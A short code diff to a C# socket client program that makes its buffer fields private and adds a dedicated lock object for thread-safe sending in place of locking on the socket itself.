@@ -29,11 +29,12 @@ namespace Client
     class Program
     {
         public static Socket Client { get; set; }
-        public static byte[] Buffer { get; set; }
-        public static long Buffersize { get; set; }
-        public static bool BufferRecevied { get; set; }
-        public static System.Threading.Timer Tick { get; set; }
-        public static MemoryStream MS { get; set; }
+        private static byte[] Buffer { get; set; }
+        private static long Buffersize { get; set; }
+        private static bool BufferRecevied { get; set; }
+        private static System.Threading.Timer Tick { get; set; }
+        private static MemoryStream MS { get; set; }
+        private static object SendSync { get; set; }
 
         static void Main(string[] args)
         {
@@ -61,6 +62,7 @@ namespace Client
                 Buffersize = 0;
                 BufferRecevied = false;
                 MS = new MemoryStream();
+                SendSync  = new object();
                 BeginSend(SendInfo());
                 TimerCallback T = Ping;
                 Tick = new System.Threading.Timer(T, null, new Random().Next(30 * 1000, 60 * 1000), new Random().Next(30 * 1000, 60 * 1000));
@@ -232,7 +234,7 @@ namespace Client
 
         public static void BeginSend(byte[] Msgs)
         {
-            lock (Client)
+            lock (SendSync)
             {
                 if (Client.Connected)
                 {
